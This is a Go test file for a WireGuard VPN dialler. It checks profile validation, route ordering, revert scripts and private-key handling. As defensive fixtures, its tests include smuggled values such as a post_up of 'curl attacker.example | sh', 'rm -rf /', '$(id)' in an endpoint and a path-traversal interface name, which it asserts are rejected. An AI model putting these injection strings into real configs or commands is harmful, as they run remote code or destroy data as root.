package vpn

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Obviously-synthetic key material: 32 bytes of 'A'/'B'/'C', which is what
// `wg` accepts and nothing else. Real keys never appear in this package's
// tests — the whole point of the file under test is that a private key goes to
// exactly one place, and a fixture that looked real would make a leak in a log
// harder to spot, not easier.
const (
	testPrivateKey   = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE="
	testPeerKey      = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI="
	testPresharedKey = "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M="
	// 31 bytes, so it is valid base64 and NOT a WireGuard key.
	testShortKey = "RERERERERERERERERERERERERERERERERERERERERA=="
)

// wireguardProfileJSON is the exact shape the workspace core writes into the
// 0600 file it hands to `vpn external-up --profile-json`.
const wireguardProfileJSON = `{
  "type": "wireguard",
  "iface": "wg0",
  "private_key": "` + testPrivateKey + `",
  "address": ["10.5.0.2/32"],
  "dns": ["1.1.1.1"],
  "mtu": 1420,
  "peer": {
    "public_key": "` + testPeerKey + `",
    "preshared_key": "",
    "endpoint": "1.2.3.4:51820",
    "allowed_ips": ["0.0.0.0/0"],
    "persistent_keepalive": 25
  }
}`

func mustProfile(t *testing.T) ExternalProfile {
	t.Helper()
	p, err := ParseExternalProfile([]byte(wireguardProfileJSON))
	if err != nil {
		t.Fatalf("the canonical profile must parse: %v", err)
	}
	return p
}

// withFakeBinaries makes the plan's binary resolution independent of whether
// the machine running `go test` happens to have wireguard-tools installed —
// and gives the dead-man's script the absolute paths it is asserted to carry.
func withFakeBinaries(t *testing.T) {
	t.Helper()
	original := lookupExternalBinary
	lookupExternalBinary = func(name string) (string, error) {
		switch name {
		case "ip":
			return "/usr/sbin/ip", nil
		case "wg":
			return "/usr/bin/wg", nil
		case "wg-quick":
			return "/usr/bin/wg-quick", nil
		}
		return "", fmt.Errorf("not found")
	}
	t.Cleanup(func() { lookupExternalBinary = original })
}

// isolateState points state.json and the synthesized-config directory at a
// throwaway home. Nothing in this package's tests may read or write the state
// of the machine running them.
func isolateState(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	return dir
}

// upHost is the netns this dialler exists for, and the fixture is VERBATIM
// output captured from the running `aw-remote-host` container on 2026-09-05 —
// not a synthetic table shaped to make these tests pass.
//
//	$ ip -o -4 route show table main
//	default via 172.18.0.1 dev eth0
//	10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1
//	172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.4
//
// That middle line is the whole reason invariant 1 exists: 10.89.0.0/24 on
// podman1 is where all 129 sibling containers live — Postgres, Redis, every
// agent runner — and a table that carried only `default dev wg0` would take
// the routed container away from every one of them while leaving its internet
// working.
func upHost() *tableRunner {
	return &tableRunner{answers: map[string]string{
		"ip -V":            "ip utility, iproute2-6.1.0",
		"docker --version": "Docker version 27.0.0",
		"ip -o -4 route show table main": "default via 172.18.0.1 dev eth0 \n" +
			"10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 \n" +
			"172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.4 \n",
		"ip route show default":   "default via 172.18.0.1 dev eth0 \n",
		"ip route show table 200": "",
	}}
}

// hetznerHost is the OTHER shape this has to work on: the bare metal, where
// the default is `via 65.109.66.65 proto static onlink` and the gateway is not
// inside any interface's subnet. It is kept because the cross-host case (an
// apply for host A executing on host B) still works and is still supported —
// it is just no longer the premise.
func hetznerHost() *tableRunner {
	r := upHost()
	r.answers["ip route show default"] = "default via 65.109.66.65 dev enp41s0 proto static onlink \n"
	return r
}

func upSpec(r Runner) ExternalUpSpec {
	return ExternalUpSpec{
		Runner:  r,
		Runtime: ContainerRuntime{Name: "docker"},
	}
}

func planUpOn(t *testing.T, r Runner, p ExternalProfile) *ExternalUpPlan {
	t.Helper()
	spec := upSpec(r)
	spec.Profile = p
	plan, err := PlanExternalUp(context.Background(), spec)
	if err != nil {
		t.Fatalf("plan: %v", err)
	}
	return plan
}

// callIndex is where a command first appears in what the runner was asked to
// do. -1 when it never was. Order is the assertion in this file, so the index
// is what the tests compare, not merely presence.
func callIndex(r *tableRunner, prefix string) int {
	for i, c := range r.calls {
		if strings.HasPrefix(c, prefix) {
			return i
		}
	}
	return -1
}

// --- the profile is typed, and unknown keys are REFUSED ----------------------

// THE structural closure. wg-quick runs PostUp as root, so the only reason a
// caller-supplied profile is safe to act on is that there is no field able to
// carry a command AND no key is silently ignored. Ignoring `post_up` today
// would mean a field of that name added later is honoured retroactively —
// which is exactly how a closed hole reopens without anybody editing the
// security-relevant line.
func TestProfileRefusesAnyKeyItDoesNotKnow(t *testing.T) {
	for _, smuggled := range []string{
		`"post_up": "curl attacker.example | sh"`,
		`"PostUp": "id > /tmp/pwned"`,
		`"pre_down": "rm -rf /"`,
		`"table": "main"`,
		`"fwmark": 1234`,
		`"save_config": true`,
		`"conf": "[Interface]\nPostUp = id"`,
	} {
		raw := strings.Replace(wireguardProfileJSON, `"type": "wireguard",`, `"type": "wireguard", `+smuggled+`,`, 1)
		if _, err := ParseExternalProfile([]byte(raw)); err == nil {
			t.Fatalf("a profile carrying %s was ACCEPTED; unknown keys must be refused, never ignored", smuggled)
		}
	}
}

func TestProfileValidatesEveryFieldItRenders(t *testing.T) {
	cases := []struct {
		name string
		from string
		to   string
		want string
	}{
		{"a private key that is not 32 bytes", testPrivateKey, testShortKey, "private_key"},
		{"a peer key that is not 32 bytes", testPeerKey, testShortKey, "peer.public_key"},
		{"an endpoint with no port", `"1.2.3.4:51820"`, `"1.2.3.4"`, "peer.endpoint"},
		{"an endpoint with a shell in it", `"1.2.3.4:51820"`, `"$(id):51820"`, "peer.endpoint"},
		{"an address that is not a CIDR", `["10.5.0.2/32"]`, `["10.5.0.2"]`, "address"},
		{"an allowed-ip that is not a CIDR", `["0.0.0.0/0"]`, `["everything"]`, "allowed_ips"},
		{"a dns entry that is not an IP", `["1.1.1.1"]`, `["nope"]`, "dns"},
		{"an mtu no interface can carry", `1420`, `70000`, "mtu"},
		{"an interface name that is a path", `"iface": "wg0"`, `"iface": "../../etc/wireguard/x"`, "interface name"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			raw := strings.Replace(wireguardProfileJSON, c.from, c.to, 1)
			_, err := ParseExternalProfile([]byte(raw))
			if err == nil {
				t.Fatalf("%s was accepted", c.name)
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Fatalf("error does not name the field (%q): %v", c.want, err)
			}
		})
	}
}

// --- the synthesized config --------------------------------------------------

// Invariant 2, and the RCE closure as an assertion rather than a comment. The
// rendered config must set Table = off — without it wg-quick installs its own
// 0.0.0.0/0 into the MAIN table and moves this machine — and must contain
// none of the directives wg-quick executes as root.
func TestSynthesizedConfigIsTableOffAndCarriesNoExecutableDirective(t *testing.T) {
	conf, err := synthesizeWireGuard(mustProfile(t), "wg0")
	if err != nil {
		t.Fatalf("synthesize: %v", err)
	}
	if !strings.Contains(conf, "Table = off") {
		t.Fatalf("Table = off is missing; wg-quick would install its own routes:\n%s", conf)
	}
	for _, bad := range append(append([]string{}, forbiddenConfigKeys...), "Table = auto", "Table = main") {
		if strings.Contains(conf, bad) {
			t.Fatalf("the synthesized config contains %q:\n%s", bad, conf)
		}
	}
	// The fields that DO have to survive into it, or the tunnel is not the one
	// that was asked for.
	for _, want := range []string{
		"PrivateKey = " + testPrivateKey,
		"PublicKey = " + testPeerKey,
		"Endpoint = 1.2.3.4:51820",
		"AllowedIPs = 0.0.0.0/0",
		"Address = 10.5.0.2/32",
		"MTU = 1420",
		"PersistentKeepalive = 25",
	} {
		if !strings.Contains(conf, want) {
			t.Fatalf("the synthesized config lost %q:\n%s", want, conf)
		}
	}
	// An empty preshared key must not render an empty PresharedKey line — wg
	// rejects one, and the tunnel would fail to come up for a field nobody set.
	if strings.Contains(conf, "PresharedKey") {
		t.Fatalf("an empty preshared key rendered a line:\n%s", conf)
	}
}

// DNS is accepted, validated and reported — and deliberately NOT rendered.
// wg-quick's DNS= is not scoped to the tunnel: it shells out to
// resolvconf/resolvectl and rewrites the resolver of the whole netns, which
// here is the one 130 containers egress through. That is the same lockout
// arriving through DNS instead of routing, and it fights
// planExternalExclusions, whose entire job is to pin the resolvers that
// already work OUTSIDE the tunnel.
func TestProfileDNSIsRecordedButNeverWrittenIntoTheConfig(t *testing.T) {
	profile := mustProfile(t)
	conf, err := synthesizeWireGuard(profile, "wg0")
	if err != nil {
		t.Fatalf("synthesize: %v", err)
	}
	if strings.Contains(conf, "DNS") || strings.Contains(conf, "1.1.1.1") {
		t.Fatalf("the resolver leaked into the config, which would rewrite the whole host's resolver:\n%s", conf)
	}
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), profile)
	if len(plan.DNS) != 1 || plan.DNS[0] != "1.1.1.1" {
		t.Fatalf("the resolver was dropped instead of reported: %v", plan.DNS)
	}
}

// The belt to the typed fields' braces. This can only fire if somebody later
// adds a field that CAN express a PostUp — and when they do, it has to be a
// red test rather than a root shell in production.
func TestAssertNoExecutableDirectiveCatchesAFutureField(t *testing.T) {
	for _, conf := range []string{
		"[Interface]\nPrivateKey = x\nPostUp = id\n",
		"[Interface]\npostdown = rm -rf /\n",
		"[Interface]\nFwMark = 51820\n",
		"[Interface]\nSaveConfig = true\n",
		"[Interface]\nTable = auto\n",
		"[Interface]\nTable = 200\n",
	} {
		if err := assertNoExecutableDirective(conf); err == nil {
			t.Fatalf("this config was accepted:\n%s", conf)
		}
	}
	if err := assertNoExecutableDirective("# a comment mentioning PostUp\n[Interface]\nTable = off\n"); err != nil {
		t.Fatalf("a comment naming a directive is not a directive: %v", err)
	}
}

// --- INVARIANT 1: connected routes before the default ------------------------

// THE highest-risk invariant on this card, asserted through the real apply
// path rather than against a string.
//
// `ip rule from <container>/32 lookup N` matches ALL of that container's
// egress, including its traffic to its siblings. A table that carries the
// default before it carries the connected routes has a window in which the
// routed container has working internet and no Postgres, no Redis and no agent
// runner — measured shape, 2026-09-05: the workspace's peers are all on
// 10.89.0.0/24 dev podman1, with 172.18.0.0/16 dev eth0 alongside.
func TestTheTableGetsTheConnectedRoutesBeforeTheDefault(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	r := upHost()
	plan := planUpOn(t, r, mustProfile(t))

	if err := applyExternalUp(context.Background(), r, *plan); err != nil {
		t.Fatalf("apply: %v", err)
	}

	defaultAt := callIndex(r, "ip route replace default dev wg0 table 200")
	if defaultAt < 0 {
		t.Fatalf("the tunnel's default was never installed; calls: %v", r.calls)
	}
	for _, connected := range []string{
		"ip route replace 10.89.0.0/24 dev podman1 table 200",
		"ip route replace 172.18.0.0/16 dev eth0 table 200",
	} {
		at := callIndex(r, connected)
		if at < 0 {
			t.Fatalf("connected route missing from the table (%q); a container pointed at table 200 would lose its siblings. calls: %v", connected, r.calls)
		}
		if at > defaultAt {
			t.Fatalf("connected route %q was installed AFTER the default (%d > %d) — that window is the outage this ordering exists to prevent", connected, at, defaultAt)
		}
	}

	// Invariant 3: the endpoint /32 is pinned through the host's real gateway
	// BEFORE the tunnel default exists, or the tunnel's own packets route into
	// the tunnel that carries them.
	pinAt := callIndex(r, "ip route add 1.2.3.4/32 via 172.18.0.1 dev eth0 onlink table 200")
	if pinAt < 0 {
		t.Fatalf("the endpoint was never pinned outside the tunnel; calls: %v", r.calls)
	}
	if pinAt > defaultAt {
		t.Fatalf("the endpoint pin landed after the default (%d > %d)", pinAt, defaultAt)
	}

	// And the interface came up before any of it.
	if up := callIndex(r, "wg-quick up "); up < 0 || up > defaultAt {
		t.Fatalf("wg-quick up is missing or out of order: %v", r.calls)
	}
}

// The same ordering, read off the plan alone, so a change to tableArgs is
// caught even if applyExternalUp stops walking it.
func TestTableArgsPutTheDefaultLast(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))
	args := plan.tableArgs("replace")
	last := args[len(args)-1]
	if strings.Join(last, " ") != "route replace default dev wg0 table 200" {
		t.Fatalf("the default is not the last route written: %v", args)
	}
	for _, a := range args[:len(args)-1] {
		if a[2] == "default" {
			t.Fatalf("a second default route appears before the last entry: %v", args)
		}
	}
}

// Invariant 3's spelling. The pin is produced by ExternalRoutePlan.excludeArgs
// — the same code vpn_external_route uses for its exclusions, not a copy — so
// the two paths cannot drift into spelling `onlink` differently. Without
// onlink this deployment's Hetzner-style layout answers `Error: Nexthop has
// invalid gateway.` and the route silently never installs.
func TestTheEndpointPinIsSpelledLikeAnExclusionAndKeepsOnlink(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))

	got := strings.Join(plan.pinPlan().excludeArgs("add", plan.endpointPrefix()), " ")
	want := "route add 1.2.3.4/32 via 172.18.0.1 dev eth0 onlink table 200"
	if got != want {
		t.Fatalf("pin spelled %q, want %q", got, want)
	}
	// And the delete has to be the same route, spelled the way ip accepts a
	// del: a route added one way and deleted another outlives its own revert.
	del := strings.Join(plan.pinPlan().excludeArgs("del", plan.endpointPrefix()), " ")
	if del != "route del 1.2.3.4/32 via 172.18.0.1 dev eth0 table 200" {
		t.Fatalf("pin del spelled %q", del)
	}

	// The bare metal is the shape onlink was added FOR: a Hetzner-style layout
	// where the gateway is not inside any interface's subnet. Without onlink
	// the kernel answers `Error: Nexthop has invalid gateway.` and the pin
	// silently never installs — measured on the first real attempt at exactly
	// this. Inside the container the gateway IS on-subnet and onlink is a
	// harmless no-op, so the same spelling is correct on both.
	bare := planUpOn(t, hetznerHost(), mustProfile(t))
	bareGot := strings.Join(bare.pinPlan().excludeArgs("add", bare.endpointPrefix()), " ")
	if bareGot != "route add 1.2.3.4/32 via 65.109.66.65 dev enp41s0 onlink table 200" {
		t.Fatalf("pin on the bare-metal shape spelled %q", bareGot)
	}
}

// Discovery, not literals. vpn-hub-entrypoint.sh's header records what naming
// a bridge cost: a hardcoded br-98e3dc4f7e7d silently became a different
// bridge and put wg-quick into a 619-restart crash loop that leaked 3,714
// iptables rules. So a host with a different fabric must produce a different
// table, with nothing in this package having an opinion about the names.
func TestConnectedRoutesAreDiscoveredAndNeverAssumed(t *testing.T) {
	r := upHost()
	r.answers["ip -o -4 route show table main"] = "default via 10.77.0.1 dev enp0s1 \n" +
		"10.77.0.0/16 dev br-deadbeef proto kernel scope link src 10.77.0.9 \n" +
		"192.168.1.0/24 via 10.77.0.254 dev enp0s1 \n" +
		"blackhole 10.9.9.0/24 \n" +
		"172.31.0.0/16 dev wg0 scope link \n"

	got, err := discoverConnectedRoutes(context.Background(), r, "wg0")
	if err != nil {
		t.Fatalf("discover: %v", err)
	}
	if len(got) != 1 || got[0].Prefix != "10.77.0.0/16" || got[0].Dev != "br-deadbeef" {
		t.Fatalf("discovery = %+v; want only the attached 10.77.0.0/16 on br-deadbeef — a `via` route is not connected, a blackhole is not a network, and the tunnel's own route belongs to the tunnel", got)
	}
}

// An empty discovery is the catastrophic shape: table N would carry a default
// and nothing else, so a container pointed at it keeps its internet and loses
// every sibling. That has to be a refusal, never a partial build.
func TestRefusesWhenNothingConnectedCanBeDiscovered(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	r := upHost()
	r.answers["ip -o -4 route show table main"] = "default via 10.89.0.1 dev eth0 \n"
	plan := planUpOn(t, r, mustProfile(t))
	if !strings.Contains(plan.Refusal, "loses every sibling container") {
		t.Fatalf("refusal = %q", plan.Refusal)
	}
	if r.ran("ip route replace") || r.ran("wg-quick up") {
		t.Fatalf("a refused plan changed something: %v", r.calls)
	}
}

// --- refusals ----------------------------------------------------------------

// OpenVPN, honestly. The binary is in the image, but a .ovpn brings up tun0
// with routes and resolvers pushed by the server, which would install routing
// this tool does not control and cannot revert. A refusal with a complete
// sentence beats a half-dialled tunnel that looks connected.
func TestOpenVPNIsARefusalWithACompleteSentence(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	raw := strings.Replace(wireguardProfileJSON, `"type": "wireguard"`, `"type": "openvpn"`, 1)
	p, err := ParseExternalProfile([]byte(raw))
	if err != nil {
		t.Fatalf("an openvpn profile must PARSE — it is refused for what it is, not rejected as malformed: %v", err)
	}
	plan := planUpOn(t, upHost(), p)
	if !strings.Contains(plan.Refusal, "OpenVPN") || !strings.Contains(plan.Refusal, "WireGuard") {
		t.Fatalf("refusal = %q; it must name what was refused and what to use instead", plan.Refusal)
	}
}

func TestRefusesAHostWithoutWireGuardTools(t *testing.T) {
	isolateState(t)
	original := lookupExternalBinary
	lookupExternalBinary = func(name string) (string, error) {
		if name == "wg-quick" {
			return "", fmt.Errorf("not found")
		}
		return "/usr/sbin/" + name, nil
	}
	t.Cleanup(func() { lookupExternalBinary = original })

	r := upHost()
	plan := planUpOn(t, r, mustProfile(t))
	if !strings.Contains(plan.Refusal, "wg-quick") {
		t.Fatalf("refusal = %q", plan.Refusal)
	}
	if len(r.calls) > 0 && r.ran("wg-quick") {
		t.Fatalf("a host with no wg-quick still tried to use it: %v", r.calls)
	}
}

// A host with no container runtime cannot confirm anything a dial did, so it
// is refused for the same reason vpn_use_exit refuses one — see
// NoContainerRuntimeRefusal.
func TestRefusesAHostWithNoContainerRuntime(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	r := upHost()
	r.errs = map[string]error{
		"docker network ls": fmt.Errorf("exit status 127"),
		"podman network ls": fmt.Errorf("exit status 127"),
	}
	spec := ExternalUpSpec{Runner: r, Profile: mustProfile(t)}
	plan, err := PlanExternalUp(context.Background(), spec)
	if err != nil {
		t.Fatalf("plan: %v", err)
	}
	if plan.Refusal == "" {
		t.Fatalf("a host with no runtime was accepted")
	}
}

// Planning is READ-ONLY. That is what makes --plan an honest preview rather
// than a second code path that might disagree with the apply.
func TestPlanningChangesNothing(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	r := upHost()
	planUpOn(t, r, mustProfile(t))
	for _, forbidden := range []string{"ip route add", "ip route del", "ip route replace", "ip rule", "wg-quick up", "wg-quick down"} {
		if r.ran(forbidden) {
			t.Fatalf("planning ran %q: %v", forbidden, r.calls)
		}
	}
}

// --- the dead-man's switch ----------------------------------------------------

// Invariant 4. The revert has to work on a machine that has just lost its
// default route, so it is POSIX sh with absolute paths and — the rule
// deadman.go states in its own header — it must NEVER call aw-remote-host: a
// self-referential revert dies with any update, rename or partial write of the
// very tool that armed it.
func TestDeadmanRevertTearsTheTunnelDownFlushesTheTableAndNeverCallsThisBinary(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))

	script := externalUpRevertScript(PrivilegedRunner{Inner: upHost(), Sudo: true}, *plan)

	if strings.Contains(script, "aw-remote-host vpn") || strings.Contains(script, "aw-remote-host ") {
		t.Fatalf("the revert calls the tool that armed it:\n%s", script)
	}
	if !strings.Contains(script, "/usr/bin/wg-quick down "+plan.ConfPath) {
		t.Fatalf("the revert does not tear the tunnel down:\n%s", script)
	}
	if !strings.Contains(script, "/usr/sbin/ip route flush table 200") {
		t.Fatalf("the revert does not flush the table:\n%s", script)
	}
	// Absolute paths, for the reason ArmSpec.TailscalePath spells out: the
	// revert runs with whatever PATH it inherits, on a machine whose network
	// has just gone.
	for _, line := range strings.Split(script, "\n") {
		body := strings.TrimPrefix(strings.TrimSpace(line), "sudo -n ")
		if body == "" {
			continue
		}
		if !strings.HasPrefix(body, "/") {
			t.Fatalf("revert line is not an absolute path: %q\n%s", line, script)
		}
	}
	// Every line tolerates its own failure — a revert that stops at the first
	// already-gone route leaves the rest behind.
	for _, line := range strings.Split(script, "\n") {
		if strings.TrimSpace(line) != "" && !strings.HasSuffix(strings.TrimSpace(line), "|| true") {
			t.Fatalf("revert line can abort the rest: %q", line)
		}
	}
	// Arm() must accept it — a switch with nothing to run reports a guarantee
	// it does not provide, and Arm refuses exactly that.
	if strings.TrimSpace(script) == "" {
		t.Fatal("the revert script is empty")
	}
}

// The revert is the mirror of the apply: the DEFAULT comes out first. If
// removing the connected routes then fails, the container is already off the
// tunnel rather than on it with half its local fabric gone.
func TestRevertRemovesTheDefaultBeforeTheConnectedRoutes(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	r := upHost()
	plan := planUpOn(t, r, mustProfile(t))

	after := &tableRunner{answers: r.answers}
	if err := revertExternalUp(context.Background(), after, *plan, nil); err != nil {
		t.Fatalf("revert: %v", err)
	}
	defaultAt := callIndex(after, "ip route del default dev wg0 table 200")
	connectedAt := callIndex(after, "ip route del 10.89.0.0/24 dev podman1 table 200")
	downAt := callIndex(after, "wg-quick down ")
	if defaultAt < 0 || connectedAt < 0 || downAt < 0 {
		t.Fatalf("revert did not remove everything it installed: %v", after.calls)
	}
	if defaultAt > connectedAt {
		t.Fatalf("the connected routes came out before the default (%d < %d)", connectedAt, defaultAt)
	}
	if downAt < defaultAt {
		t.Fatalf("the tunnel went down before its routes were removed (%d < %d)", downAt, defaultAt)
	}
}

// --- idempotence, invariant 6 --------------------------------------------------

// Assume the invocation may be delivered twice — one exec_start has been
// observed producing two POSTs. A second identical dial has to CONVERGE and
// say so, not re-arm a switch and re-apply a tunnel already carrying traffic.
func TestASecondIdenticalDialConverges(t *testing.T) {
	withFakeBinaries(t)
	home := isolateState(t)
	r := upHost()
	plan := planUpOn(t, r, mustProfile(t))

	// Nothing recorded yet: this is a fresh dial, not an already-up one.
	if plan.AlreadyUp {
		t.Fatal("a host with no recorded tunnel reported one already up")
	}
	if err := saveExternalTunnelState(*plan); err != nil {
		t.Fatalf("save: %v", err)
	}
	if _, err := os.Stat(filepath.Join(home, ".aw-remote-host", "state.json")); err != nil {
		t.Fatalf("state was not written into the isolated home: %v", err)
	}

	// Now the machine agrees with the record: the peer is on the interface and
	// the table carries the default.
	live := upHost()
	live.answers["wg show wg0 peers"] = testPeerKey + "\n"
	live.answers["ip route show table 200"] = "default dev wg0 scope link \n10.89.0.0/24 dev podman1 \n"
	second := planUpOn(t, live, mustProfile(t))
	if !second.AlreadyUp {
		t.Fatal("the same profile, already up, was not recognised — a re-delivered dial would re-apply it")
	}

	// A DIFFERENT profile against the same live interface is NOT already up.
	other, err := ParseExternalProfile([]byte(strings.Replace(wireguardProfileJSON, "1.2.3.4:51820", "5.6.7.8:51820", 1)))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if planUpOn(t, live, other).AlreadyUp {
		t.Fatal("a different profile was mistaken for the recorded one")
	}
}

// The record is what the teardown undoes. It must round-trip the discovered
// routes, because re-discovering them after the tunnel is up would compute a
// set that was never installed and leave the real one behind.
func TestTheRecordRoundTripsWhatTheDialInstalled(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))
	if err := saveExternalTunnelState(*plan); err != nil {
		t.Fatalf("save: %v", err)
	}
	loaded, err := loadExternalTunnelPlan()
	if err != nil || loaded == nil {
		t.Fatalf("load: %v", err)
	}
	if strings.Join(flatten(loaded.tableArgs("del")), "|") != strings.Join(flatten(plan.tableArgs("del")), "|") {
		t.Fatalf("the teardown would remove different routes than the dial installed:\n got %v\nwant %v", loaded.tableArgs("del"), plan.tableArgs("del"))
	}
	if err := clearExternalTunnelState(); err != nil {
		t.Fatalf("clear: %v", err)
	}
	if again, _ := loadExternalTunnelPlan(); again != nil {
		t.Fatal("the record survived being cleared")
	}
}

func flatten(in [][]string) []string {
	out := make([]string, 0, len(in))
	for _, a := range in {
		out = append(out, strings.Join(a, " "))
	}
	return out
}

// --- the private key goes to exactly ONE place ---------------------------------

// Everything this feature emits — the plan, the reply the workspace parses,
// the state file, the narration — is serialized somewhere a human or a control
// plane reads. The private key belongs in the 0600 config and nowhere else.
func TestNothingButTheConfigEverCarriesThePrivateKey(t *testing.T) {
	withFakeBinaries(t)
	home := isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))
	if err := saveExternalTunnelState(*plan); err != nil {
		t.Fatalf("save: %v", err)
	}

	planJSON, _ := json.Marshal(plan)
	payloadJSON, _ := json.Marshal(ExternalUpResult{Plan: *plan}.Payload())
	stateJSON, err := os.ReadFile(filepath.Join(home, ".aw-remote-host", "state.json"))
	if err != nil {
		t.Fatalf("read state: %v", err)
	}
	for name, blob := range map[string][]byte{
		"the plan":       planJSON,
		"the reply":      payloadJSON,
		"the state file": stateJSON,
		"the revert script": []byte(externalUpRevertScript(
			PrivilegedRunner{Inner: upHost(), Sudo: true}, *plan)),
	} {
		if strings.Contains(string(blob), testPrivateKey) {
			t.Fatalf("%s carries the private key:\n%s", name, blob)
		}
		if strings.Contains(string(blob), testPresharedKey) {
			t.Fatalf("%s carries the preshared key:\n%s", name, blob)
		}
	}
}

// The synthesized file is 0600 and lives in a 0700 directory of this tool's
// own, never /etc/wireguard — a generated profile must not land where
// something else scans for tunnels to auto-start.
func TestTheSynthesizedConfigIsPrivate(t *testing.T) {
	home := isolateState(t)
	path, err := ExternalTunnelConfPath("wg0")
	if err != nil {
		t.Fatalf("path: %v", err)
	}
	if !strings.HasPrefix(path, filepath.Join(home, ".aw-remote-host")) || strings.Contains(path, "/etc/") {
		t.Fatalf("config path is %q", path)
	}
	conf, err := synthesizeWireGuard(mustProfile(t), "wg0")
	if err != nil {
		t.Fatalf("synthesize: %v", err)
	}
	if err := writeExternalConf(path, conf); err != nil {
		t.Fatalf("write: %v", err)
	}
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("config is mode %04o, want 0600", fi.Mode().Perm())
	}
	di, err := os.Stat(filepath.Dir(path))
	if err != nil {
		t.Fatalf("stat dir: %v", err)
	}
	if di.Mode().Perm() != 0o700 {
		t.Fatalf("config dir is mode %04o, want 0700", di.Mode().Perm())
	}
}

// --- confirmation --------------------------------------------------------------

// An interface that exists is not a tunnel that works. A peer that has never
// handshaked reports zero, and zero is a real answer that must never be
// rendered as an age — the same rule the read side (mergeHandshake) follows.
func TestHandshakeIsReadPerPeerAndZeroMeansNever(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))

	r := upHost()
	r.answers["wg show wg0 latest-handshakes"] = "someoneelse=\t1788318109\n" + testPeerKey + "\t0\n"
	if got := latestHandshake(context.Background(), r, *plan); got != 0 {
		t.Fatalf("handshake = %d, want 0 — this peer has never completed one", got)
	}
	r.answers["wg show wg0 latest-handshakes"] = testPeerKey + "\t1788318109\n"
	if got := latestHandshake(context.Background(), r, *plan); got != 1788318109 {
		t.Fatalf("handshake = %d", got)
	}
}

// The default has to be in the tunnel's table AND point at the tunnel. A
// default via something else is somebody else's, and treating it as ours would
// report a dial that never happened.
func TestDefaultInTableMustPointAtThisTunnel(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))

	r := upHost()
	r.answers["ip route show table 200"] = "default via 10.8.0.2 dev wg1 \n"
	if ok, _ := defaultInTable(context.Background(), r, *plan); ok {
		t.Fatal("a default out of a different interface was accepted as this tunnel's")
	}
	r.answers["ip route show table 200"] = "default dev wg0 scope link \n"
	if ok, err := defaultInTable(context.Background(), r, *plan); err != nil || !ok {
		t.Fatalf("this tunnel's own default was not recognised (%v)", err)
	}
}

// A PRODUCT LIMITATION, and it has to reach the screen in plain words rather
// than as a 45-second dial that silently reverts.
//
// WireGuard begins a handshake only when it has traffic to send or a keepalive
// fires. Nothing sends traffic through a freshly-built tunnel — the table
// exists but no rule points at it yet — so with keepalive at 0 the handshake
// this dial waits for never happens.
func TestAProfileWithNoKeepaliveIsRefusedUpFrontInPlainWords(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)

	raw := strings.Replace(wireguardProfileJSON, `"persistent_keepalive": 25`, `"persistent_keepalive": 0`, 1)
	p, err := ParseExternalProfile([]byte(raw))
	if err != nil {
		t.Fatalf("keepalive 0 is a VALID profile — it is refused for what it means, not rejected as malformed: %v", err)
	}

	r := upHost()
	plan := planUpOn(t, r, p)
	if plan.Refusal != KeepaliveZeroRefusal {
		t.Fatalf("refusal = %q, want the verbatim KeepaliveZeroRefusal sentence", plan.Refusal)
	}
	// Plain words a user can act on, not jargon.
	for _, phrase := range []string{"persistent_keepalive", "cannot dial it", "PersistentKeepalive", "25"} {
		if !strings.Contains(plan.Refusal, phrase) {
			t.Fatalf("the refusal does not say %q in plain words: %s", phrase, plan.Refusal)
		}
	}
	// Refused BEFORE anything is touched, and before the binaries are even
	// hunted for — the whole point of doing it at plan time.
	for _, forbidden := range []string{"wg-quick", "ip route", "ip rule"} {
		if r.ran(forbidden) {
			t.Fatalf("a refused profile still touched the machine (%q): %v", forbidden, r.calls)
		}
	}
	// And the ordinary profile is unaffected.
	if planUpOn(t, upHost(), mustProfile(t)).Refusal != "" {
		t.Fatal("a profile WITH a keepalive was refused")
	}
}

// The confirm-time failure has to read differently from the plan-time refusal.
// Reaching it means a keepalive WAS configured and the peer still did not
// answer — a peer or network problem, not the product limitation — and
// conflating the two would send a user to change a field that is already set.
func TestNoHandshakeWithAKeepaliveBlamesThePeerNotTheProfile(t *testing.T) {
	withFakeBinaries(t)
	isolateState(t)
	plan := planUpOn(t, upHost(), mustProfile(t))

	// The host's egress is stubbed and UNCHANGED, so the confirmation gets
	// past the host-moved short-circuit and reaches the handshake check —
	// which is the thing under test. Stubbed rather than measured because a
	// unit test must not depend on the network of whoever runs `go test`.
	original := hostPublicIP
	hostPublicIP = func(context.Context) (Egress, error) {
